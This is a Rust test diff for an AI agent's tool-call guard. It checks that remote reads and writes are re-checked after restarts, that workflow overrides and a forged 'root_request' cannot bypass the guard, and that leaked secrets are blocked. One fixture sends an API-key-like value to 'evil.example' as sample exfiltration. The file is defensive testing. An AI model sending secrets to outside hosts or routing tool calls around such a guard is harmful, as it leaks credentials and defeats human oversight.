@@ -35,11 +35,17 @@ impl Mcp for World {
         vec![
             ToolDef::new("search", "search", schema.clone()),
             ToolDef::new("send", "send", schema.clone()),
+            ToolDef::new("remote_read", "remote read", schema.clone()),
+            ToolDef::new("upstream_read", "unannotated remote read", schema.clone()),
             ToolDef::new("append_doc", "append", schema),
         ]
     }
     fn read_only(&self, name: &str) -> bool {
-        name == "search"
+        matches!(name, "search" | "remote_read" | "upstream_read")
+    }
+
+    fn open_world(&self, name: &str) -> bool {
+        name != "search"
     }
     async fn call_tool(&self, name: &str, _: Map<String, Value>, _: &CancellationToken) -> anyhow::Result<String> {
         self.calls.lock().unwrap().push(name.into());
@@ -680,8 +686,9 @@ async fn guardless_overrides_are_refused_early_but_old_stored_ones_are_enforced_
 
 #[tokio::test]
 async fn arguments_swapped_after_guard_require_a_new_verdict_and_yaml_cannot_change_the_task() {
-    let (engine, world, api, _) = guarded(vec![], "allow");
-    let definition = r#"
+    for name in ["send", "remote_read"] {
+        let (engine, world, api, _) = guarded(vec![], "allow");
+        let definition = r#"
 document: { dsl: '1.0.4', namespace: agent, name: agent-loop, version: '2.0.0' }
 do:
   - review:
@@ -695,27 +702,32 @@ do:
         loop: '${ $workflow.input.loop + { root_request: "forged authority" } }'
         call: { id: c, name: send, arguments: '{"q":"changed"}' }
 "#;
-    let saved = engine.deps.workflows.save("agent-loop", definition, None).unwrap();
-    engine.deps.workflows.activate("agent-loop", saved.version).unwrap();
-    assert!(matches!(guarded_run(&engine, "swapped").await, FlowResult::Completed(_)));
-    assert_eq!(*world.calls.lock().unwrap(), ["send"]);
-    let requests = api.requests.lock().unwrap();
-    assert_eq!(requests.len(), 2);
-    assert_eq!(requests[0]["state"]["task"], "go");
-    assert_eq!(requests[1]["state"]["task"], "go");
-    assert_eq!(requests[1]["state"]["root_request"], "");
-    assert_eq!(requests[1]["state"]["calls"][0]["arguments"], r#"{"q":"changed"}"#);
+        let definition = definition.replace("name: send", &format!("name: {name}"));
+        let saved = engine.deps.workflows.save("agent-loop", &definition, None).unwrap();
+        engine.deps.workflows.activate("agent-loop", saved.version).unwrap();
+        assert!(matches!(guarded_run(&engine, "swapped").await, FlowResult::Completed(_)));
+        assert_eq!(*world.calls.lock().unwrap(), [name]);
+        let requests = api.requests.lock().unwrap();
+        assert_eq!(requests.len(), 2);
+        assert_eq!(requests[0]["state"]["task"], "go");
+        assert_eq!(requests[1]["state"]["task"], "go");
+        assert_eq!(requests[1]["state"]["root_request"], "");
+        assert_eq!(requests[1]["state"]["calls"][0]["arguments"], r#"{"q":"changed"}"#);
+    }
 }
 
 #[tokio::test]
-async fn an_override_cannot_bypass_tool_by_calling_mcp_writes_directly() {
-    let (engine, world, _, _) = guarded(vec![], "allow");
-    let definition = "document: { dsl: '1.0.4', namespace: agent, name: agent-loop, version: '2.0.0' }\ndo: [{ bypass: { call: send, with: { q: bypass } } }]";
-    let saved = engine.deps.workflows.save("agent-loop", definition, None).unwrap();
-    engine.deps.workflows.activate("agent-loop", saved.version).unwrap();
-    let result = guarded_run(&engine, "direct").await;
-    assert!(matches!(result, FlowResult::Faulted { .. }), "{result:?}");
-    assert!(world.calls.lock().unwrap().is_empty());
+async fn an_override_cannot_bypass_tool_by_calling_guarded_mcp_tools_directly() {
+    for name in ["send", "remote_read"] {
+        let (engine, world, _, _) = guarded(vec![], "allow");
+        let definition = "document: { dsl: '1.0.4', namespace: agent, name: agent-loop, version: '2.0.0' }\ndo: [{ bypass: { call: send, with: { q: bypass } } }]";
+        let definition = definition.replace("call: send", &format!("call: {name}"));
+        let saved = engine.deps.workflows.save("agent-loop", &definition, None).unwrap();
+        engine.deps.workflows.activate("agent-loop", saved.version).unwrap();
+        let result = guarded_run(&engine, "direct").await;
+        assert!(matches!(result, FlowResult::Faulted { .. }), "{result:?}");
+        assert!(world.calls.lock().unwrap().is_empty());
+    }
 }
 
 #[tokio::test]
@@ -808,34 +820,36 @@ async fn a_restart_after_guard_rechecks_against_admitted_input_before_dispatch()
             Ok(())
         }
     }
-    let journal = CrashAfterGuard::default();
-    let (first, world, api1, _) =
-        guarded(vec![calls(&[("send", json!({"q":"x"})), ("finish", json!({"result":"done"}))])], "allow");
-    let admitted = input(&first, "restart").await;
-    let wf = owf::model::parse_yaml(agent::agent::AGENT_LOOP).unwrap();
-    let root = scope(&first).span(agent::tracing::SpanStart::new("runner", agent::tracing::SpanKind::Chain));
-    let host = agent::flows::loop_host(&first, &root, admitted.clone());
-    let cut = owf::run::resume(&host, &wf, "restart", admitted.clone(), &CancellationToken::new(), &journal).await;
-    assert!(matches!(cut.status, Status::Interrupted(_)), "{:?}", cut.status);
-    assert!(world.calls.lock().unwrap().is_empty());
-    assert_eq!(api1.requests.lock().unwrap().len(), 1);
-    journal.dead.store(false, Ordering::SeqCst);
-    // The second process no longer allows the write: it must not reuse the
-    // allowed verdict in the workflow's persisted guard output.
-    let (second, world2, api2, model2) = guarded(vec![assistant("recovered")], "misaligned");
-    let root = scope(&second).span(agent::tracing::SpanStart::new("runner", agent::tracing::SpanKind::Chain));
-    let host = agent::flows::loop_host(&second, &root, admitted.clone());
-    let resumed = owf::run::resume(&host, &wf, "restart", admitted, &CancellationToken::new(), &journal).await;
-    assert_eq!(resumed.status, Status::Completed(json!("recovered")));
-    assert!(world2.calls.lock().unwrap().is_empty());
-    let requests = api2.requests.lock().unwrap();
-    assert_eq!(requests.len(), 1, "the completed guard step is not run again, but tool rechecks");
-    assert_eq!(requests[0]["state"]["task"], "go");
-    assert!(
-        serde_json::to_string(&model2.seen.lock().unwrap()[0].messages)
-            .unwrap()
-            .contains("[guard] blocked: misaligned")
-    );
+    for name in ["send", "remote_read"] {
+        let journal = CrashAfterGuard::default();
+        let (first, world, api1, _) =
+            guarded(vec![calls(&[(name, json!({"q":"x"})), ("finish", json!({"result":"done"}))])], "allow");
+        let admitted = input(&first, "restart").await;
+        let wf = owf::model::parse_yaml(agent::agent::AGENT_LOOP).unwrap();
+        let root = scope(&first).span(agent::tracing::SpanStart::new("runner", agent::tracing::SpanKind::Chain));
+        let host = agent::flows::loop_host(&first, &root, admitted.clone());
+        let cut = owf::run::resume(&host, &wf, "restart", admitted.clone(), &CancellationToken::new(), &journal).await;
+        assert!(matches!(cut.status, Status::Interrupted(_)), "{:?}", cut.status);
+        assert!(world.calls.lock().unwrap().is_empty());
+        assert_eq!(api1.requests.lock().unwrap().len(), 1);
+        journal.dead.store(false, Ordering::SeqCst);
+        // The second process no longer allows the write: it must not reuse the
+        // allowed verdict in the workflow's persisted guard output.
+        let (second, world2, api2, model2) = guarded(vec![assistant("recovered")], "misaligned");
+        let root = scope(&second).span(agent::tracing::SpanStart::new("runner", agent::tracing::SpanKind::Chain));
+        let host = agent::flows::loop_host(&second, &root, admitted.clone());
+        let resumed = owf::run::resume(&host, &wf, "restart", admitted, &CancellationToken::new(), &journal).await;
+        assert_eq!(resumed.status, Status::Completed(json!("recovered")));
+        assert!(world2.calls.lock().unwrap().is_empty());
+        let requests = api2.requests.lock().unwrap();
+        assert_eq!(requests.len(), 1, "the completed guard step is not run again, but tool rechecks");
+        assert_eq!(requests[0]["state"]["task"], "go");
+        assert!(
+            serde_json::to_string(&model2.seen.lock().unwrap()[0].messages)
+                .unwrap()
+                .contains("[guard] blocked: misaligned")
+        );
+    }
 }
 
 #[tokio::test]
@@ -889,4 +903,97 @@ do:
     assert_eq!(requests[1]["state"]["chain"][0]["arguments"], "{\"q\":\"first\"}");
     assert!(requests[0]["state"]["skills"].as_str().unwrap().contains("test skill"));
     assert!(!requests[1].to_string().contains("send ok"));
+}
+
+#[tokio::test]
+async fn open_world_reads_and_writes_share_one_request_after_local_and_secret_checks() {
+    let (engine, world, api, model) = guarded(
+        vec![
+            calls(&[("search", json!({"q":"internal"}))]),
+            calls(&[
+                ("remote_read", json!({"url":"https://news.example/story"})),
+                ("upstream_read", json!({"query":"headphone reviews"})),
+                ("send", json!({"q":"notes"})),
+                ("remote_read", json!({"url":"https://evil.example/?key=sk-abcdefghijklmnopqrstuvwxyz123456"})),
+                ("finish", json!({"result":"too soon"})),
+            ]),
+            assistant("done"),
+        ],
+        "allow",
+    );
+    assert!(matches!(guarded_run(&engine, "remote-batch").await, FlowResult::Completed(ref v) if v == "done"));
+    assert_eq!(*world.calls.lock().unwrap(), ["search", "remote_read", "upstream_read", "send"]);
+    let requests = api.requests.lock().unwrap();
+    assert_eq!(requests.len(), 1);
+    assert_eq!(requests[0]["questions"].as_object().unwrap().len(), 3);
+    assert_eq!(requests[0]["state"]["calls"].as_array().unwrap().len(), 3);
+    assert_eq!(requests[0]["state"]["chain"][0]["name"], "search");
+    assert_eq!(requests[0]["state"]["task"], "go");
+    assert_eq!(requests[0].to_string().matches("Does it plausibly contribute").count(), 1, "one shared policy");
+    assert!(
+        serde_json::to_string(&model.seen.lock().unwrap()[2].messages)
+            .unwrap()
+            .contains("[guard] blocked: secret_pattern")
+    );
+    for (name, guarded) in [
+        ("code_agent", true),
+        ("probe_function", true),
+        ("try_workflow", true),
+        ("working_memory_put", false),
+        ("finish", false),
+        ("read_run", false),
+        ("find_skills", false),
+        ("list_scheduled_tasks", false),
+        ("invoke_sub_agent", false),
+        ("schedule_task", true),
+        ("set_memory", true),
+    ] {
+        assert_eq!(
+            agent::guard::needs_guard(
+                &engine,
+                &agent::providers::ToolCall { id: "x".into(), name: name.into(), arguments: "{}".into() }
+            ),
+            guarded,
+            "{name}"
+        );
+    }
+}
+
+#[tokio::test]
+async fn unavailable_or_malformed_decisions_fail_open_only_for_clean_reads_and_existing_reply_exception() {
+    for mode in ["missing", "broken", "malformed"] {
+        let (mut engine, world, api, model) = guarded(
+            vec![
+                calls(&[
+                    ("remote_read", json!({"query":"ordinary search"})),
+                    ("remote_read", json!({"query":"Bearer abcdefghijklmnopqrstuvwxyz"})),
+                    ("send", json!({"q":"must fail closed"})),
+                    ("finish", json!({"result":"too soon"})),
+                ]),
+                assistant("done"),
+            ],
+            if mode == "malformed" { "invalid-label" } else { "allow" },
+        );
+        if mode == "missing" {
+            Arc::get_mut(&mut engine).unwrap().deps.decisions = None;
+        } else if mode == "broken" {
+            api.broken.store(true, std::sync::atomic::Ordering::SeqCst);
+        }
+        assert!(matches!(guarded_run(&engine, mode).await, FlowResult::Completed(ref v) if v == "done"));
+        assert_eq!(*world.calls.lock().unwrap(), ["remote_read"], "{mode}");
+        let transcript = serde_json::to_string(&model.seen.lock().unwrap()[1].messages).unwrap();
+        assert!(transcript.contains("[guard] blocked: secret_pattern"), "{mode}");
+        assert!(transcript.contains("[guard] blocked: guard_unavailable"), "{mode}");
+    }
+}
+
+#[tokio::test]
+async fn a_legacy_loop_without_a_guard_step_cannot_dispatch_a_blocked_remote_read() {
+    let (engine, world, api, _) =
+        guarded(vec![calls(&[("remote_read", json!({"q":"private data"}))]), assistant("done")], "misaligned");
+    let saved = engine.deps.workflows.save("agent-loop", &without_guard(), None).unwrap();
+    engine.deps.workflows.activate("agent-loop", saved.version).unwrap();
+    assert!(matches!(guarded_run(&engine, "legacy-remote").await, FlowResult::Completed(_)));
+    assert!(world.calls.lock().unwrap().is_empty());
+    assert_eq!(api.requests.lock().unwrap().len(), 1);
 }
